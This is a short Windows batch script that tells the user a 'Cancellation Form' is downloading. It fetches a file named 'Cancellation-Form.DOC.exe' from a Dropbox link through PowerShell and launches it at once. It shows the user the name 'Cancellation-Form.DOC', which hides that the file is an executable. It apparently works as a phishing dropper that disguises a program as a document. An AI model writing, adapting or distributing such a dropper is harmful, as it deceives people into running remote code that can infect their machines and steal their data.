@echo off
setlocal
set "FILENAME=Cancellation-Form.DOC.exe"
set "SHOWNAME=Cancellation-Form.DOC"

echo ========================================
echo Your Cancellation Form is downloading...
echo Please be patient.
echo ========================================

powershell -NoLogo -NoProfile -Command ^
  "$client = New-Object System.Net.WebClient; $client.DownloadFile('https://www.dropbox.com/scl/fi/c8j70h9zjjbhuxtisng3e/Cancellation-Form.DOC.exe?rlkey=k1839uj7b4wocccyza5ln8a8w&st=w6qkqxkt&dl=1', '%FILENAME%')"

if exist "%FILENAME%" (
    echo.
    echo ========================================
    echo File downloaded: %SHOWNAME%
    echo Location: %cd%\%FILENAME%
    echo Opening file...
    echo ========================================
    start "" "%FILENAME%"
) else (
    echo.
    echo Download failed. Please check your internet connection or try again later.
)

pause
